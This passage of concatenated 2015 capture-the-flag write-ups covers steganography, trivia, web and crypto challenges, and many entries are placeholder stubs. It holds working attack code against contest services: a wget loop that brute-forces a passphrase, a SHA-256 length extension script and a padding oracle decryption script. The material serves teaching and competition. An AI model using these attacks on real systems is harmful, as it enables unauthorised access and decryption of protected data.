Extracting  0
Extracting  1
Extracting  10
Extracting  100
[...]
Extracting  997
Extracting  998
Extracting  999

Everything is Ok

Files: 1000
Size:       12000
Compressed: 105579
$ cd out
$ md5 * | sort -k1
bad77862a36f0c5bb90a75500fad3985  0
bad77862a36f0c5bb90a75500fad3985  1
bad77862a36f0c5bb90a75500fad3985  10
[...]
bad77862a36f0c5bb90a75500fad3985  998
bad77862a36f0c5bb90a75500fad3985  999
cc5c5b83ac14f86100dc92e279a911de  368
$ cat 0
NotHiNg HeRe
$ cat 368
GoOd 3RlZ30=
```

We get another piece of the puzzle, (`3RlZ30=`). Looks like a base64 encoded string?

Running `exiftool` on `4.jpg`, we get the fourth piece, `ZmxhZ`, from the `Artist` exif field:

```bash
$ exiftool 4.jpg
ExifTool Version Number         : 9.99
File Name                       : 4.jpg
Directory                       : .
File Size                       : 6.9 kB
File Modification Date/Time     : 2015:01:18 21:14:24+01:00
File Access Date/Time           : 2015:12:21 19:08:08+01:00
File Inode Change Date/Time     : 2015:12:21 19:06:41+01:00
File Permissions                : rw-r-----
File Type                       : JPEG
File Type Extension             : jpg
MIME Type                       : image/jpeg
JFIF Version                    : 1.01
Resolution Unit                 : None
X Resolution                    : 1
Y Resolution                    : 1
Exif Byte Order                 : Little-endian (Intel, II)
Artist                          : If you insist here is your gift: ZmxhZ
Comment                         : 
Image Width                     : 187
Image Height                    : 186
Encoding Process                : Baseline DCT, Huffman coding
Bits Per Sample                 : 8
Color Components                : 3
Y Cb Cr Sub Sampling            : YCbCr4:2:0 (2 2)
Image Size                      : 187x186
Megapixels                      : 0.035
```

Trailing data in the fifth picture, `5.jpg`, tells us to look closely:

![](./trailing5.png)

We can get the fifth piece, `TaU1w`, using `stegsolve` in a blue pane:

![](./solved.png)

The sixth piece of the puzzle (`TGUtU`) is in the trailing data of `6.jpg`:

![](./trailing6.png)

Our six puzzle pieces can be permutated to generate the correct flag using [this python script](./permutations.py):

```bash
$ python2.7 permutations.py
[...]
flag{Just-aSiMpLe-Steg}
[...]
```

The flag is `flag{Just-aSiMpLe-Steg}`.
## Other write-ups and resources

* <http://bannsecurity.com/index.php/home/10-ctf-writeups/25-th3jackers-ctf-2015-ultimate-steg>
* [Persian](http://nevermore.blog.ir/post/th3jackers-2015-CTF-writeup)
# Th3Jackers CTF 2015: TRLOL

**Category:** Trivia
**Points:** 150
**Solves** 14
**Description:**

> Description: 58076138, go there and take the flag LOL!
>
> Attachment:

## Write-up

by [polym](https://github.com/abpolym)

Googling for `58076138` in Google Images results in this [meme](http://memegenerator.net/instance/58076138):

![](58076138.jpg)

The text we read is:

> Hey your flag is ZmxhZ3t1dTIwMTV1dX0 - I will find you and kill you

base64 decoding this string via `echo 'ZmxhZ3t1dTIwMTV1dX0' | base64 --decode` results in `flag{uu2015u`.

So we are missing something on the end of the string. We read `I will find you and kill you` and see that `you=u` and therefore we add the character `u` to the string: `ZmxhZ3t1dTIwMTV1dX0u`.

Now we base64 decode this new string again to get the flag:

```
$ echo 'ZmxhZ3t1dTIwMTV1dX0u' | base64 --decode
flag{uu2015uu}.
```

## Other write-ups and resources

* none yet
# Th3Jackers CTF 2015: Simpsons

**Category:** Trivia
**Points:** 200
**Solves** 8
**Description:**

> Description: Are you a fan of Simpsons ? Find the relation with computer history
>
> Attachment:

## Write-up

by [polym](https://github.com/abpolym)

The flag was `flag{john frink}`.

![](frink.png)

## Other write-ups and resources

* none yet
# Th3Jackers CTF 2015: 0/\/\4|2

**Category:** Trivia
**Points:** 50
**Solves** 8
**Description:**

> Description: My password is 0/\/\4|2 , and my flag is the password of omar and the password is the date of brith of 0/\/\4|2, What is the full name of 0/\/\4|2

## Write-up

by [polym](https://github.com/abpolym)

The flag was `flag{the password of omar}`.

## Other write-ups and resources

* none yet
# Th3Jackers CTF 2015: WEB

**Category:** Web
**Points:** 200
**Solves** 2
**Description:**

> Description: Down
>
> Attachment:

## Write-up

(TODO)

## Other write-ups and resources

* none yet
# Th3Jackers CTF 2015: Don't wast your time

**Category:** Web
**Points:** 300
**Solves** 6
**Description:**

> Description: 159.8.48.196:3117
>
> Attachment:

## Write-up

by [polym](https://github.com/abpolym)

Besides a question of the best command-line text editor, the given homepage had a HTML comment with a base64 encoded message in it:

> RWRpdGVkIGJ5IGphY2tzdG9uZSB1c2luZyBuYW5vIGVkaXRvcg==

Decoding this text with `echo 'RWRpdGVkIGJ5IGphY2tzdG9uZSB1c2luZyBuYW5vIGVkaXRvcg==' | base64 --decode`, we get `Edited by jackstone using nano editor`.

After trying to access several nano config files `*.nanorc`, nano backup files `index.php~`, `*.nanorc~` and other files `.htaccess`, `robots.txt`, we are reading about `nano`'s emergency file extension `.save`.

When applying this extension to `index.php` and accessing `159.8.48.196:3117/index.php.save`, we are getting [this php file](index.php.save).

Understanding this php file leads us to the exploit:
	* The server reads a query parameter called `passphase`
	* Test the length of the passph(r)ase by adding a character one by one, until the server returns `incorrect` instead of `nop`.
	* Now bruteforce the passphrase by trying all possible passwords, for example by using a big password list.

The command might look like:

```
$ grep -o ....... rockyou.txt | while read pw; do wget -qO- "http://159.8.48.196:3177/?passphase=$pw" & done | grep -v 'incorrect'

TODO: Correct flag?
```

## Other write-ups and resources

* none yet
# Thailand CTF 2015: I_Need_help

**Category: -**
**Points: 100**
**Solves: TODO**
**Description: TODO**

## Write-up

(TODO)# Thailand CTF 2015: log_analysis

**Category: -**
**Points: 100**
**Solves: TODO**
**Description: TODO**

## Write-up

(TODO)# Thailand CTF 2015: MsPing

**Category: -**
**Points: 100**
**Solves: TODO**
**Description: TODO**

## Write-up

(TODO)

## Other write-ups and resources

* <https://www.facebook.com/139105159494751/photos/a.253651668040099.59247.139105159494751/903217219750204/?type=3&fref=nf># Thailand CTF 2015: Digital_Envelope

**Category: -**
**Points: 150**
**Solves: TODO**
**Description: **

> Hint
>		My name is my password

## Write-up

(TODO)# Thailand CTF 2015: MrTony

**Category: -**
**Points: 150**
**Solves: TODO**
**Description: TODO**

## Write-up

(TODO)# Thailand CTF 2015: Secret_Message

**Category: -**
**Points: 150**
**Solves: TODO**
**Description: TODO**

## Write-up

(TODO)# Thailand CTF 2015: Close_your_eye

**Category: -**
**Points: 200**
**Solves: TODO**
**Description: TODO**

## Write-up

(TODO)# Thailand CTF 2015: Evidence_was_found

**Category: -**
**Points: 200**
**Solves: TODO**
**Description: TODO**

> Challenge can be download [here](https://drive.google.com/open?id=0B7IUFMzhGLwSMHh2dldqeFlrRGs)

## Write-up

(TODO)# Thailand CTF 2015: Reverse_Me_Please

**Category: -**
**Points: 200**
**Solves: TODO**
**Description: TODO**

## Write-up

(TODO)# Thailand CTF 2015: Hidden

**Category: -**
**Points: 250**
**Solves: TODO**
**Description: TODO**

> Challenge can be download [here](https://drive.google.com/open?id=0B7IUFMzhGLwSUlYyU0paZzRaUk0)

## Write-up

(TODO)# Thailand CTF 2015: Ciphertext

**Category: -**
**Points: 300**
**Solves: TODO**
**Description: TODO**

> Challenge can be download [here](https://drive.google.com/open?id=0B7IUFMzhGLwSUlYyU0paZzRaUk0)

## Write-up

(TODO)# Thailand CTF 2015: Nickelback

**Category: -**
**Points: 300**
**Solves: TODO**
**Description: TODO**

## Write-up

(TODO)# Thailand CTF 2015: Traffic_capture
**Category: -**
**Points: 300**
**Solves: TODO**
**Description: TODO**

> Challenge can be download [here](https://drive.google.com/open?id=0B7IUFMzhGLwSQWI2czVrckxJSE0)

## Write-up

(TODO)# Thailand CTF 2015: Forensics_Evidence
**Category: -**
**Points: 350**
**Solves: TODO**
**Description: TODO**

> Challenge can be download [here](https://drive.google.com/open?id=0B7IUFMzhGLwSd2VoUWFsal9qY3M)

## Write-up

(TODO)# Thailand CTF 2015: Find_me

**Category: -**
**Points: 50**
**Solves: TODO**
**Description: TODO**

## Write-up

(TODO)# Thailand CTF 2015: Fix_Image

**Category: -**
**Points: 50**
**Solves: TODO**
**Description: TODO**

## Write-up

(TODO)# Thailand CTF 2015: Obfuscation

**Category: -**
**Points: 50**
**Solves: TODO**
**Description: TODO**

## Write-up

(TODO)# Thailand CTF 2015: Stare_the_picture

**Category: -**
**Points: 50**
**Solves: TODO**
**Description: TODO**

## Write-up

(TODO)# Thailand CTF 2015 write-ups

- https://www.thailand-ctf.org/
- [Scoreboard](https://www.thailand-ctf.org/) or local alternative (TODO)

## Completed writes-up

## External write-ups only

- [100-MsPing](100-MsPing)

## Missing write-ups

- [50-Find_me](50-Find_me)
- [50-Fix_Image](50-Fix_Image)
- [50-Obfuscation](50-Obfuscation)
- [50-Stare_the_picture](50-Stare_the_picture)
- [100-I_Need_help](100-I_Need_help)
- [100-log_analysis](100-log_analysis)
- [150-Digital_Envelope](150-Digital_Envelope)
- [150-MrTony](150-MrTony)
- [150-Secret_Message](150-Secret_Message)
- [200-Close_your_eye](200-Close_your_eye)
- [200-Evidence_was_found](200-Evidence_was_found)
- [200-Reverse_Me_Please](200-Reverse_Me_Please)
- [250-Hidden](250-Hidden)
- [300-Ciphertext](300-Ciphertext)
- [300-Nickelback](300-Nickelback)
- [300-Traffic_capture](300-Traffic_capture)
- [350-Forensics_Evidence](350-Forensics_Evidence)# Trend Micro CTF 2015: defensive-100

**Category:** Analysis Defensive
**Points:** 100
**Solves:**
**Description:**



## Write-up

(TODO)

## Other write-ups and resources

* <http://capturetheswag.blogspot.com.au/2015/09/trend-micro-ctf-vonn-analysis-defensive.html>
* <https://taishi8117.github.io/2015/10/21/trendCTF-defence100/>
* <https://github.com/RandomsCTF/write-ups/tree/master/Trend%20Micro%20CTF%20Asia%20Pacific%20%26%20Japan%202015%20Online%20Qualifier/Analysis%20-%20Defensive%20100%20%5Breverse%5D%20(100)>
* <https://github.com/ByteBandits/writeups/blob/master/trend-micro-ctf-2015/analysis/defensive-100/sudhackar/README.md>
# Trend Micro CTF 2015: defensive-200

**Category:** Analysis Defensive
**Points:** 200
**Solves:**
**Description:**

> Capture the flag by analyzing the [file](AnalyzeThis.zip). (pass: TMCTF2015)


## Write-up

(TODO)

## Other write-ups and resources

* <https://github.com/smokeleeteveryday/CTF_WRITEUPS/tree/master/2015/TMCTF/analysis_defensive/analysis_defensive200>
# Trend Micro CTF 2015: defensive-300

**Category:** Analysis Defensive
**Points:** 300
**Solves:**
**Description:**

> This is a REAL backdoor [network traffic](net.zip)!
>
> Tracing hacker's footprint to find the key!
>
> Hint:
>
> Poison Ivy / admin
>
> Zip Password: trace_hacker


## Write-up

(TODO)

## Other write-ups and resources

* <https://github.com/RandomsCTF/write-ups/tree/master/Trend%20Micro%20CTF%20Asia%20Pacific%20%26%20Japan%202015%20Online%20Qualifier/Analysis%20-%20Defensive%20300>
* <https://github.com/smokeleeteveryday/CTF_WRITEUPS/tree/master/2015/TMCTF/analysis_defensive/analysis_defensive300>
# Trend Micro CTF 2015: offensive-100

**Category:** Analysis-Offensive
**Points:** 100
**Solves:**
**Description:**

> http://ctfquest.trendmicro.co.jp:8888/95f20bb7856574e91db4402435a87427


## Write-up

(TODO)

## Other write-ups and resources

* <https://github.com/RandomsCTF/write-ups/tree/master/Trend%20Micro%20CTF%20Asia%20Pacific%20%26%20Japan%202015%20Online%20Qualifier/Analysis%20-%20Offensive%20100>
* <https://0x90r00t.com/2015/09/28/trend-micro-2015-analysis-offensive-100-write-up/>
* <https://github.com/p4-team/ctf/tree/master/2015-09-26-trendmicro/offensive100#eng>
# Trend Micro CTF 2015: offensive-100

**Category:** Analysis-Offensive
**Points:** 200
**Solves:**
**Description:**

> [VirusClicker.apk](VirusClicker.apk)  


## Write-up

(TODO)

## Other write-ups and resources

* <https://boaster.github.io/re/2015/09/26/TrendMicro-CTF-Offensive-200.html>
* <http://0xecute.com/index.php/2015/11/11/microtrend-android-virusclicker/>
# Trend Micro CTF 2015: others-100

**Category:** Analysis
**Points:** 100
**Solves:**
**Description:**

> Please fix the [PDF](fix_my_pdf.pdf) file for me.


## Write-up

(TODO)

## Other write-ups and resources

* <https://0x90r00t.com/2015/09/27/trend-micro-2015-analysis-other-100-write-up/>
* <https://github.com/p4-team/ctf/blob/master/2015-09-26-trendmicro/other100/README.md#eng>
# Trend Micro CTF 2015: crypto-100

**Category:** Crypto
**Points:** 100
**Solves:**
**Description:**

> You're given an [RSA public key](PublicKey.pem) and an encrypted message which contains a flag. Get the flag.
>
> There's also a hint about "1bit" being wrong in the public key.
>
> message: kPmDFLk5b/torG53sThWwEeNm0AIpEQek0rVG3vCttc=


## Write-up

(TODO)

## Other write-ups and resources

* <https://b01lers.net/challenges/Trend%20Micro%20Qualifier%202015/RSA%20Missing%20bit/65/>
* <https://github.com/RandomsCTF/write-ups/tree/master/Trend%20Micro%20CTF%20Asia%20Pacific%20%26%20Japan%202015%20Online%20Qualifier/Crypto%20100>
* <https://github.com/smokeleeteveryday/CTF_WRITEUPS/tree/master/2015/TMCTF/crypto/crypto100>
* <https://github.com/p4-team/ctf/tree/master/2015-09-26-trendmicro/rsa#eng-version>
* <https://yanapermana.wordpress.com/2015/09/27/trend-micro-2015-write-up-ctf-cryptography-100/>
* <https://github.com/ByteBandits/writeups/blob/master/trend-micro-ctf-2015/crypto/crypto-100/chaitan94/README.md>
# Trend Micro CTF 2015: crypto-200

**Category:** Crypto
**Points:** 200
**Solves:**
**Description:**

> Zip Password: image_q
>
> Your [small program](Q.zip) has been drew by kid, some values are missed, but you feel you can restore it!
>
> Please try to find the value of AES IV key.


## Write-up

(TODO)

## Other write-ups and resources

* <https://b01lers.net/challenges/Trend%20Micro%20Qualifier%202015/Q/66/>
* <https://github.com/smokeleeteveryday/CTF_WRITEUPS/tree/master/2015/TMCTF/crypto/crypto200>
* <https://github.com/p4-team/ctf/tree/master/2015-09-26-trendmicro/aes#eng-version>
* <https://github.com/dqi/ctf_writeup/tree/master/2015/tmctf/crypto200>
# Trend Micro CTF 2015: crypto-300

**Category:** Crypto
**Points:** 300
**Solves:**
**Description:**

> What is the most famous default password of ["keystore"](level1.zip)?


## Write-up

(TODO)

## Other write-ups and resources

* <https://p4f.github.io/2015-TMCTF-online-qual-crypto300/> 
# Trend Micro CTF 2015: crypto-500

**Category:** Crypto
**Points:** 500
**Solves:**
**Description:**

> Think about two different alphabetical strings with the same lengths. After you encode the strings with Base64 respectively, if you find characters located in the same position between the two strings, then you may want to extract them. You may find examples where the final strings are ‘2015’ and ‘Japan’ if you place the extracted characters from left to right in order.
>
> Example:
>
> CaEkMbVnD→(Base64)→Q2FFa01iVm5E
> GePoMjXNW→(Base64)→R2VQb01qWE5X
>                     2   01   5
>
> aBckjTiRgbpS→(Base64)→YUJja2pUaVJnYnBT
> URehZQjLyvwk→(Base64)→VVJlaFpRakx5dndr
>                         J a p a    n
> Character 'a' may appear in the extracted string like the example above, character f will never appear. Please find a list of characters that would not appear in the extracted string, even if you specify any alphabetical characters in the input. Once you come up with a list of characters, please sort the characters in the order of ASCII table and generate a SHA1 hash value in lower case. This is the flag you are looking for.
>
> Please submit the flag in the format of 'TMCTF{}'.


## Write-up

(TODO)

## Other write-ups and resources

* <https://github.com/RandomsCTF/write-ups/tree/master/Trend%20Micro%20CTF%20Asia%20Pacific%20%26%20Japan%202015%20Online%20Qualifier/Crypto%20500>
* <https://ctftime.org/writeup/1810>
# Trend Micro CTF 2015: misc-100

**Category:** Misc
**Points:** 100
**Solves:**
**Description:**

> We were given an empty [crossword](crossword.xlsx) and a bunch of definition.
>
> Once you fill in all the answers, list the first character of Across 3 to 24 and Down 1 to 22 in the above order.
>
> Once you create a string, please generate its MD5 checksum, which is the flag of this challenge.
> In the example above, the checksum would be 0d8014d00ea607c445b4a270af35a4d2
>
> Please submit the flag in the format of TMCTF{<checksum>}.


## Write-up

(TODO)

## Other write-ups and resources

* <https://0x90r00t.com/2015/09/29/trend-micro-2015-miscellaneous-crossword-write-up/>
* <https://github.com/RandomsCTF/write-ups/tree/master/Trend%20Micro%20CTF%20Asia%20Pacific%20%26%20Japan%202015%20Online%20Qualifier/Miscellaneous%20100>
# Trend Micro CTF 2015: misc-300

**Category:** Misc
**Points:** 300
**Solves:**
**Description:**

> The challenge was to correctly solve 500 consecutive captcha codes


## Write-up

(TODO)

## Other write-ups and resources

* <https://github.com/p4-team/ctf/tree/master/2015-09-26-trendmicro/captcha#eng-version> 
* <https://b01lers.net/challenges/Trend%20Micro%20Qualifier%202015/CAPTCHA/64/>
# Trend Micro CTF 2015: programming-100

**Category:** programming
**Points:** 100
**Solves:**
**Description:**

> Click the different Color

> ![](squares.png)

> The number of increases after we solve few

## Write-up

(TODO)

## Other write-ups and resources

* <https://0x90r00t.com/2015/09/29/trend-micro-2015-progamming-100-write-up/>
* <https://b01lers.net/challenges/Trend%20Micro%20Qualifier%202015/Click%20on%20the%20Different%20Color/63/>
* <https://github.com/RandomsCTF/write-ups/tree/master/Trend%20Micro%20CTF%20Asia%20Pacific%20%26%20Japan%202015%20Online%20Qualifier/Programming%20100>
* <https://yanapermana.wordpress.com/2015/09/28/trend-micro-2015-write-up-ctf-programming-100/>
* <https://ctftime.org/writeup/1780>
* <https://github.com/p4-team/ctf/tree/master/2015-09-26-trendmicro/colors#eng-version>
* <https://aeacussec.pt/blog/index.php/2015/09/27/trendmicro-ctf-programming100-click-the-different-color-2/>
# Trend Micro CTF 2015: programming-200

**Category:** Programming
**Points:** 200
**Solves:**
**Description:**

> Calculate it.

> `nc ctfquest.trendmicro.co.jp 51740`


## Write-up

(TODO)

## Other write-ups and resources

* <https://0x90r00t.com/2015/09/30/trend-micro-2015-programming-200-write-up/>
* <https://b01lers.net/challenges/Trend%20Micro%20Qualifier%202015/Solve%20the%20Equation/70/>
* <https://github.com/RandomsCTF/write-ups/tree/master/Trend%20Micro%20CTF%20Asia%20Pacific%20%26%20Japan%202015%20Online%20Qualifier/Programming%20200>
* <http://whitehatters.academy/bilingual-sums/>
* <https://github.com/p4-team/ctf/tree/master/2015-09-26-trendmicro/calculator#eng-version>
* <https://aeacussec.pt/blog/index.php/2015/09/27/trendmicro-ctf-programming200-calculated-it/>
* <https://yanapermana.wordpress.com/2015/09/27/trend-micro-2015-ctf-programming-200/>
* <https://github.com/ByteBandits/writeups/blob/master/trend-micro-ctf-2015/prog/calculator/chaitan94/README.md>
# Trend Micro CTF 2015: programming-300

**Category:** programming
**Points:** 300
**Solves:**
**Description:**

> We were given 1001 mazes with one starting and one ending point. We started with 13000 energy and each time you crossed the same spot you lost energy. There were also some checkpoint and energy drink in the maze. You could only use energy drink once.
> 
> We had to solve each maze without running out of energy and submit our solution in the format: LLL RR ...
>
>


## Write-up

(TODO)

## Other write-ups and resources

* <https://b01lers.net/challenges/Trend%20Micro%20Qualifier%202015/Maze/67/>
* <http://whitehatters.academy/labyrinth-of-1001-mazes/>
# Trend Micro CTF 2015: programming-500

**Category:**
**Points:**
**Solves:**
**Description:**

> I'm playing heads up blackjack. I'm dealt Ace-2 and the dealer has 3 showing. What's the probably of winning if: 1) I stand or 2) I kept playing.
>


## Write-up

(TODO)

## Other write-ups and resources

* <https://b01lers.net/challenges/Trend%20Micro%20Qualifier%202015/You%20gotta%20know%20when%20to%20fold%20'em.%20%20Know%20when%20to%20hol/68/> 
# Trend Micro CTF 2015 CTF write-ups

* <TODO>
* [Scoreboard](https://ctf.trendmicro.co.jp/ranking.html) or [local alternative](score.txt)

## Completed write-ups

* none yet

## External write-ups only

* [analysis/defensive-100](analysis/defensive-100)
* [analysis/defensive-200](analysis/defensive-200)
* [analysis/defensive-300](analysis/defensive-300)
* [analysis/offensive-100](analysis/offensive-100)
* [analysis/offensive-200](analysis/offensive-200)
* [analysis/others-100](analysis/others-100)
* [crypto/crypto-100](crypto/crypto-100)
* [crypto/crypto-200](crypto/crypto-200)
* [crypto/crypto-300](crypto/crypto-300)
* [crypto/crypto-500](crypto/crypto-500)
* [misc/misc-100](misc/misc-100)
* [misc/misc-300](misc/misc-300)
* [programming/programming-100](programming/programming-100)
* [programming/programming-200](programming/programming-200)
* [programming/programming-300](programming/programming-300)
* [programming/programming-500](programming/programming-500)

## Missing write-ups# TUM CTF Teaser 2015: bad_apple

**Category:** Crypto
**Points:** 15
**Solves:** 43
**Description:**

> Baby's 1st
> 
> [bad_apple.tar.xz](bad_apple.tar.xz)
> 
> try:
>     ncat 1.ctf.link 1027 < good.bin
> expect:
>     "hello"


## Write-up

by [f0rki](https://github.com/f0rki)

The code for the service is pretty small and given the low amount of
points it will be pretty straight forward. 

The service expects a message with a very simple format:
```
[tag][message]
```
whereas the tag is a `SHA256` hash over a unknown key and the message.
If the service cannot verify the tag it will just print `bad`. Otherwise
if it contains the string `hello pls` it will return the string `hello`
and if it contains the string `flag pls` it will return the flag.

```python
#!/usr/bin/env python3
import sys, binascii
from Crypto.Hash import SHA256

key = open('key.bin', 'rb').read()

message = sys.stdin.buffer.read(0x100)
if len(message) < SHA256.digest_size:
  print('len')
  exit(0)

tag, message = message[:SHA256.digest_size], message[SHA256.digest_size:]

if SHA256.new(key + message).digest() != tag:
  print('bad')
  exit(0)

if b'hello pls' in message:
  print('hello')
if b'flag pls' in message:
  print(open('flag.txt', 'r').read())
```

Additionally we are given the content of `good.bin`, which is a valid message
that contains the `hello pls` string. Obviously our goal is to craft a valid
message that contains the string to print the flag.

If we look at the computation of the tag, it is just `SHA256(K || M)`. This is
a very unfortunate implementation of an HMAC. There is a very good reason that
the standard way of constructing [HMACs is a little more complex](https://en.wikipedia.org/wiki/Hash-based_message_authentication_code).

The reason for this is that all hash functions that are constructed using
the Merkle–Damgård construction are prone to [length extension attacks](https://en.wikipedia.org/wiki/Length_extension_attack). These types of hash
functions basically split the data into blocks of the same size and apply a 
compression function, which updates the internal state of the hash function.
The last block is padded in a standardized way and then the internal state is
the output of the hash function. 

This means that you can take a hash `H(M1)` as the internal state of your hash
function and update it with further data and you receive a valid hash 
`H(M1 || pad || M2)` and you don't even have to know `M1`.

In our case it's the `key` we don't know, but we can construct a valid tag
for the message `"hello pls" + pad + "flag pls"` given the valid message
we have.

To perform the length extension attack we can use the excellent [HashPump](https://github.com/bwall/HashPump)
tool, which even has python bindings now called `hashpumpy` (available via pip).
The only tricky part here is that for a hash length extension attack to work we
need to know the length of `key`. But as it turns out the bruteforce approach worked
pretty well in this case. Here is the attack script:

```python
from pwn import *
from base64 import b16encode, b16decode
from hashpumpy import hashpump

taglen = 256 / 8
tag = None
orig_msg = None
append_msg = "flag pls"

with open("./good.bin") as f:
    tag = f.read(taglen)
    orig_msg = f.read()

log.info("original tag was: \n" + hexdump(tag))
log.info("original message was: " + orig_msg)


def check_for_flag(msg):
    """send msg to service and check if we received the flag"""
    rem = remote("1.ctf.link", 1027)
    rem.send(msg)
    rem.shutdown("write")
    data = rem.recv()
    rem.close()
    if "bad" in data:
        return False
    m = re.search("(hxp{.+})", data)
    if m:
        log.info("hooray found the flag: " + m.groups()[0])
        return True
    log.info("received\n" + hexdump(data))
    return False


def perform_hlext(tag, orig_msg, append_msg, keylen):
    """take the tag and the orig_msg, perform hash length extension
    for the given key length.
    returns [tag][message]"""
    newdgst, newmsg = hashpump(b16encode(tag),
                               orig_msg,
                               append_msg,
                               keylen)
    log.info("hashpump returned: \ndigest: {}\nmsg: {}"
             .format(newdgst, repr(newmsg)))
    return b16decode(newdgst.strip().upper()) + newmsg


# bruteforce the key length
for i in range(256):
    log.info("Trying key length {}".format(i))
    m = perform_hlext(tag, orig_msg, append_msg, i)
    if check_for_flag(m):
        break
```

After running this for a little and looking at some `bad`'s, it will find the right key 
length and we get the flag `hxp{M3rkL3_D4mg4rd_h4s_s0m3_Pr0bl3mZ}`

## Other write-ups and resources

* <https://github.com/ByteBandits/writeups/blob/master/tum-ctf-teaser-2015/crypto/bad_apple/sudhackar/README.md>
# TUM CTF Teaser 2015: linear

**Category:** Crypto
**Points:** 350
**Solves:** 1
**Description:**

> [linear.tar.xz](linear.tar.xz)


## Write-up

(TODO)

## Other write-ups and resources

* none yet
# TUM CTF Teaser 2015: pudel

**Category:** Crypto
**Points:** 30
**Solves:** 15
**Description:**

> Baby's 1st
> 
> [pudel.tar.xz](pudel.tar.xz)


## Write-up

by [f0rki](https://github.com/f0rki)

We received the code of the service, which is again written in python
and rather short, and a pcap of a client interacting with the service.
The service basically reads data from the socket and tries to decrypt
it using AES in a self-implemented CBC mode. It will then check the
padding and tell us whether the padding is bad or not. It concludes
by printing `kthx`.

```python
#!/usr/bin/env python3
import os, socket, binascii
from Crypto.Cipher import AES

key = open('key.bin', 'rb').read()

lsock = socket.socket()
lsock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
lsock.bind(('', 1043))
lsock.listen(16)

while True:

  sock, addr = lsock.accept()
  print(addr, end = ' ')

  message = sock.recv(0x100)
  if len(message) < 32 or len(message) % 16:
    print('len')
    sock.send(b'len\n')
    continue

  blocks = [message[i : i + 16] for i in range(0, len(message), 16)]

  aes = AES.new(key, AES.MODE_ECB)
  prev_block = blocks[0]
  blocks = blocks[1:]
  message = b''
  for block in blocks:
    message += bytes(x ^ y for x, y in zip(aes.decrypt(block), prev_block))
    prev_block = block

  n = message[-1]
  if n not in range(1, 17) or any(message[-i] != message[-1] for i in range(1, n + 1)):
    print('bad')
    sock.send(b'bad\n')
    sock.close()
    continue
  message = message[:-n]
  print(binascii.hexlify(message).decode())

  sock.send(b'kthx\n')
  sock.close()
```

So there isn't much interaction going on, so it's rather obvious that
this service acts as a 
[padding oracle](https://en.wikipedia.org/wiki/Padding_oracle_attack).
Also the challenge is called `Pudel`, which is german for poodle, which is the 
name for a prominent SSL vulnerability. So our goal is to use the service
as padding oracle and decrypt the encrypted data in the pcap file.

Padding oracle attacks are pretty cool because they allow you to guess
the content of a ciphertext block byte by byte, which reduces the guess
complexity in our case from `pow(256, 16)` to `256 * 16 == 4096`, which is 
pretty good. The attack works in the following way. We start by guessing
the last byte of the last plaintext block. To check whether the guess was 
correct we change the last byte of the previous ciphertext block to 
`guess ^ c[-2][-1] ^ 0x01`. Because of the way CBC works, this screws up the 
plaintext `p[-2]` and will XOR the value `guess ^ 0x01` to the last byte of 
the last plaintext block `p[-1]`. If we guessed right `guess ^ p[-1][-1] == 0` 
and the last byte of the decrypted plaintext will be `0x01`. This means we 
have a correct padding at the end of the plaintext. If we have guessed
wrong, there will be some other value and we get a bad padding error. We 
then continue guessing the next byte of `p[-1]` but aiming for a two byte 
padding with `0x02` bytes at the end.

This is all a little painful to implement, but fortunately there's a python 
module for that :) I used 
[python-paddingoracle](https://github.com/mwielgoszewski/python-paddingoracle)
and it worked like a charm. After implementing the client that queries
the service for the padding error, all that was left was to wait.

```python
from pwn import *  # NOQA
import socket
from Crypto.Cipher import AES

from paddingoracle import BadPaddingException, PaddingOracle

HOST = "131.159.74.81"
PORT = 1043

# extracted from pcap
encdata = [0xcb, 0x3f, 0x73, 0xdd, 0x38, 0x76, 0x1b, 0x17,
           0x5c, 0x9b, 0x38, 0x07, 0xef, 0x00, 0x46, 0x9b,
           0xd0, 0x9e, 0x46, 0xc3, 0x5f, 0xcd, 0xec, 0x07,
           0xbd, 0x06, 0xab, 0x61, 0x51, 0x82, 0xce, 0x21,
           0x06, 0xc2, 0x02, 0x9f, 0xd5, 0xd0, 0x27, 0x4f,
           0x6c, 0x84, 0x5b, 0x5a, 0x58, 0xaa, 0xfa, 0x2f,
           0xca, 0x23, 0xfb, 0xbd, 0xdb, 0x5d, 0x1c, 0x49,
           0xb3, 0x56, 0x7d, 0x62, 0x97, 0xda, 0x7d, 0x69]

log.info("%d blocks of AES", len(encdata) // AES.block_size)
# split the blocks
bs = AES.block_size
iv = encdata[:bs]
blocks = [encdata[bs:2 * bs],
          encdata[2 * bs:3 * bs],
          encdata[3 * bs:]]

encdata_s = ""
for b in blocks:
    for c in b:
        encdata_s += chr(c)

class PadBuster(PaddingOracle):
    def __init__(self, **kwargs):
        super(PadBuster, self).__init__(**kwargs)

    def oracle(self, data, **kwargs):
        log.info(hexdump(data))
        #rem = remote(HOST, PORT)
        rem = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        rem.connect((HOST, PORT))
        rem.sendall("".join(chr(x) for x in data))
        line = rem.recv(5)
        #self.history.append(line)
        log.debug(line)
        if "len" in line:
            raise Exception("length of sent data is wrong!")
        if "bad" in line:
            raise BadPaddingException()
        rem.close()
        del rem


padbuster = PadBuster()
data = padbuster.decrypt(encdata_s, block_size=AES.block_size, iv=iv)
log.info(data)
```

After running the script for some time the flag 
`hxp{ev3n_1n_2015_SSL_st1LL_c4nT_g3t_1t_r1ghT}` appeared.

## Other write-ups and resources

* none yet
# TUM CTF Teaser 2015: really_slow_arithmetic

**Category:** Crypto
**Points:** 150
**Solves:** 4
**Description:**

> Your task is simple: ssh -i id_rsa -p 1122 ctf@1.ctf.link
> 
> Oh, and here's the key, because we love you <3 :)
> [rly_slow_ar](rly_slow_ar)


## Write-up

(TODO)

## Other write-ups and resources

* <http://hxp.io/blog/20/TUMCTF%20Teaser%202015:%20crypto150%20%22really_slow_arithmetic%22%20writeup/># TUM CTF Teaser 2015: turbo

**Category:** Crypto
**Points:** 100
**Solves:** 13
**Description:**

> Here's some kind of semi-secure shell, however we don't have the key. Can you obtain the secret nevertheless?
> 
> nc 1.ctf.link 1033
> 
> [turbo.py](turbo.py)


## Write-up

by [f0rki](https://github.com/f0rki)

This was a fun challenge. Again the service is written in python. This services seems
to involve two secrets we don't know. We can send a password and a command, if the 
password is correct it will be executed. The flag and the output are then encrypted
with AES-CBC and an unkown key.

```python

#!/usr/bin/env python3
from Crypto.Cipher import AES
import binascii, gzip, subprocess

try:
    pw, cmd = input().split(' ', 1)
except ValueError:
    exit(1)

goodpw = open('password.txt', 'r').read().strip()
assert len(goodpw) >= 32

key = open('key.bin', 'rb').read()
assert len(key) in AES.key_size
